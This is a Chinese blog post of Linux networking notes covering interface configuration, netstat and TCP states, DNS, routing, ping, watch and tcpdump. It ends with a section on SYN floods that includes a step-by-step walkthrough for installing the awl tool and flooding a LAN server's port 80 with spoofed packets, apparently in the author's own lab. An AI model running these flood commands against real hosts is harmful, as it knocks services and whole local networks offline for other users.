---
title: Linux 基础
author: 饼铛
tags:
  - Web集群
  - tools
categories:
  - Web集群
cover: /images/img-75.png
abbrlink: 312ec9e0
date: 2019-04-03 19:38:00
---
## 1.网络调试
### 1.1临时关启网卡
```bash
ifup {interface} || ifconfig {interface} up
ifdown {interface} || ifconfig {interface} down
```
### 1.2添加多块网卡
```bash
[felix@es-node03 ~]$ cat /etc/sysconfig/network-scripts/ifcfg-ens160 
TYPE=Ethernet  #设备类型为以太网设备
BOOTPROTO=none #是否启用该设备 static静态IP 或dhp 或none无（不指定），如是none，配上IP地址和 static效果一样
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=ens160  	#网卡名字
UUID=6b1f051d-11c8-4d83-ba66-c6d98414ca84 #网卡UUID，全球唯一
DEVICE=ens160	#设备名字，再内核中识别的名字
ONBOOT=yes		#启用该设备，如果no，表示不启动此网络设备
IPADDR=192.168.200.153	#IP地址
PREFIX=24		#子网掩码，24相当于255.255.255.0
GATEWAY=192.168.200.1	#网关
DNS1=172.18.16.1	#首选DNS
IPV6_PEERDNS=yes
IPV6_PEERROUTES=yes

cp /etc/sysconfig/network-scripts/ifcfg-ens160 /etc/sysconfig/network-scripts/ifcfg-ens161
#更改内容ens161
NAME=ens161
UUID=6b1f051d-11c8-4d83-ba66-c6d98414ca84 #删除UUID
DEVICE=ens161
IPDADDR=192.168.200.154

systemctl restart NetworkManager
systemctl restart network
```
### 1.3配置临时IP
```bash
ifconfig {interface} {ip addr}
```
### 1.4查看端口监听状态
netstat命令：查看系统中网络连接状态信息
常用的参数格式：netstat- lntup
- -a -all显示本机所有连接和监听的端口
- -n \-\-numeric don't resolve names以数字形式显示当前建立的有效连接和端口
- -u 显示ud协议连接
- -t显示tcp协议连接
- -p，\-\-programs显示连接对应的PID与程序名
- -u显示udp协议连接

```bash
[root@es-node03 ~]# netstat -lntup
Active Internet connections (only servers)
协议  接收  发送    本地IP地址              远程IP地址              状态     PID
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8070            0.0.0.0:*               LISTEN      3790/python3 
```
`LISTEN`：(Listening for a connection.)侦听来自远方的TCP端口的连接请求
`SYN-SENT`：(Active; sent SYN. Waiting for a matching connection request after having sent a connection request.)再发送连接请求后等待匹配的连接请求
`SYN-RECEIVED`：(Sent and received SYN. Waiting for a confirming connection request acknowledgment after having both received and sent connection requests.)再收到和发送一个连接请求后等待对方对连接请求的确认
`ESTABLISHED`：(Connection established.)代表一个打开的连接
`FIN-WAIT-1`：(Closed; sent FIN.)等待远程TCP连接中断请求，或先前的连接中断请求的确认
`FIN-WAIT-2`：(Closed; FIN is acknowledged; awaiting FIN.)从远程TCP等待连接中断请求
`CLOSE-WAIT`：(Received FIN; waiting to receive CLOSE.)等待从本地用户发来的连接中断请求
`CLOSING`：(Closed; exchanged FIN; waiting for FIN.)等待远程TCP对连接中断的确认
`LAST-ACK`：(Received FIN and CLOSE; waiting for FIN ACK.)等待原来的发向远程TCP的连接中断请求的确认
`TIME-WAIT`：(In 2 MSL (twice the maximum segment length) quiet wait after close. )等待足够的时间以确保远程TCP接收到连接中断请求的确认
`CLOSED`：(Connection is closed.)没有任何连接状态
```bash
服务器中存在大量
[root@es-node03 ~]# cat /proc/sys/net/ipv4/tcp_fin_timeout 
2
#通过缩短时间 time walt时间来快速释放链接
vim /etc/sysctl.conf
net.ipv4.tcp_fin_timeout = 2
```
### 1.5DNS相关配置
`/etc/hosts`文件，优先级高于DNS解析
```bash
cat /etc/hosts
192.168.200.148  node1
192.168.200.149  node2
192.168.200.153  node3
```
`/etc/resolv.conf`
注：在 centos5版本，配置dns用这个文件。在 centos6 7以后，直接在网卡配置文件中指定`DNS1=192168.1.1`
```bash
[root@es-node03 ~]# cat /etc/resolv.conf 
# Generated by NetworkManager
nameserver 172.18.16.1
```
问：为什么hosts优先级高于dns
```bash
[root@es-node03 ~]# grep "hosts:" /etc/nsswitch.conf
#hosts:     db files nisplus nis dns
hosts:      files dns myhostname #files（/etc/hosts）放在了dns前面）
```
### 1.6系统路由信息
```bash
[root@es-node03 ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.200.1   0.0.0.0         UG    0      0        0 ens160
表示任何网段    默认网关       所有主机  
```
添加删除路由条目
```bash
route add -net 192.168.300.0 netmask 255.255.255.0 dev ens161
				网段       掩码            出接口
route del -net 192.168.300.0 netmask 255.255.255.0
```
路由跟踪：查看经过多少三层设备的数量
```bash
[root@es-node03 ~]# traceroute 172.18.16.1
traceroute to 172.18.16.1 (172.18.16.1), 30 hops max, 60 byte packets
 1  localhost (192.168.200.1)  22.189 ms  22.913 ms  23.730 ms
 2  * * *
```
### 1.7ping命令
ping {ip addr}
- -c 数目 在发送指定数目的包后停止
- -i 秒数 设定间隔几秒送一个网络封包给一台机器，预设值是一秒送一次
- -I ens161 指定从哪个接口出去

arping -I ens160 192.168.200.1 #观察mac地址是否一样，一样则没有人冒充网关
```bash
ARPING 192.168.200.1 from 192.168.200.153 ens160
Unicast reply from 192.168.200.1 [E8:BD:D1:F6:6A:B3]  4.658ms
Unicast reply from 192.168.200.1 [E8:BD:D1:F6:6A:B3]  3.815ms
Unicast reply from 192.168.200.1 [E8:BD:D1:F6:6A:B3]  4.710ms
```
### 1.8watch命令
watch作用：实时监测命令的运行结果，可以看到所有变化数据包的大小
- -d，--differences #高亮显示指令输出信息不同之处； 
- -n，--interval seconds #指定指令执行的间隔时间（秒）

例：每隔1秒高亮差异显示ens33相关信息
```bash
watch -d -n 1 ifconfig ens160
Every 1.0s: ifconfig ens160                  Tue Jun 16 10:32:20 2020

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.200.153  netmask 255.255.255.0  broadcast 192.168.200.255
        inet6 fe80::250:56ff:fe9d:b0b  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:9d:0b:0b  txqueuelen 1000  (Ethernet)
        RX packets 9665169  bytes 8799755781 (8.1 GiB)
        RX errors 0  dropped 20  overruns 0  frame 0
        TX packets 7473274  bytes 6814218750 (6.3 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
### 1.9tcpdump抓包
tcpdump常用参数：
- -c 指定包个数
- -n ip,端口用数字方式显示
- -i 指定接口
- port 指定端口

```bash
[root@es-node03 ~]# tcpdump -n -c 30 port 22 -i ens160
```

### 1.10SYN洪水攻击
**SYN洪水攻击主要源于**： tcp协议的三次握手机制
**SYN洪水攻击的过程**：
- 在服务端返回一个确认的SYN-ACK包的时候有个潜在的弊端，如果发起的客户是一个不存在的客户端，那么服务端就不会接到客户端回应的ACK包。
- 这时服务端需要耗费一定的数量的系统内存来等待这个**未决的连接**，直到等待超关闭时间，才能施放内存。
- 如果恶意者通过通过ip欺骗，发送大量SYN包给受害者系统，导致服务端存在大量未决的连接并占用大量内存和tcp连接，从而导致正常客户端无法访问服务端，这就是SYN洪水攻击的过程。

使用awl伪装MAC对内网的服务器施实syn洪水攻击
awl下载地址：[https://pincheng.lanzous.com/ij9dxdq3aqd](https://pincheng.lanzous.com/ij9dxdq3aqd)
```bash
[root@es-node03 ~]# tar -xf awl-0.2.tar.gz 
[root@es-node03 ~]# cd awl-0.2/
[root@es-node03 ~/awl-0.2]# ./configure && make -j 4 && make install
[root@es-node03 ~/awl-0.2]# which awl
/usr/local/bin/awl

[root@es-node03 ~/awl-0.2]# ping 192.168.200.153
PING 192.168.200.153 (192.168.200.153) 56(84) bytes of data.
64 bytes from 192.168.200.153: icmp_seq=1 ttl=64 time=0.322 ms
[root@es-node03 ~]# arp -n | grep 153
192.168.200.153          ether   00:50:56:9d:0b:0b   C    ens160
#获取目标主机mac地址
```
awl 的格式如下:
`awl -i ens160 -m 00:50:56:9d:0b:0b -d 192.168.200.153 -p 80`
参数如下:
- -i 发送包的接口,如果省略默认是eth0
- -m 被攻击机器的mac地址,程序不能根据被攻击IP得到MAC,需要手工指定.先ping 目标IP,再arp -a就可以看到.
如果省略则为ff:ff:ff:ff:ff:ff :这表示向同一网段內的所有主机发出ARP广播，进行SYN攻击，还容易使整个局域网瘫痪
- -d 被攻击机器的IP
- -p 被攻击机器的端口.
这里注意，手动指定-i参数很重要，比如我们的网卡是ens160,那就要指定 -i ens160，alvin的实测结果显示，不这样指定的时候，攻击无效。

```bash
[root@es-node03 ~]# netstat -na | grep "SYN_RECV"
tcp        0      0 192.168.200.153:80      218.149.245.64:17552    SYN_RECV   
tcp        0      0 192.168.200.153:80      111.187.179.3:49721     SYN_RECV   
tcp        0      0 192.168.200.153:80      59.171.38.91:26277      SYN_RECV   
tcp        0      0 192.168.200.153:80      17.139.112.127:34437    SYN_RECV
...
```
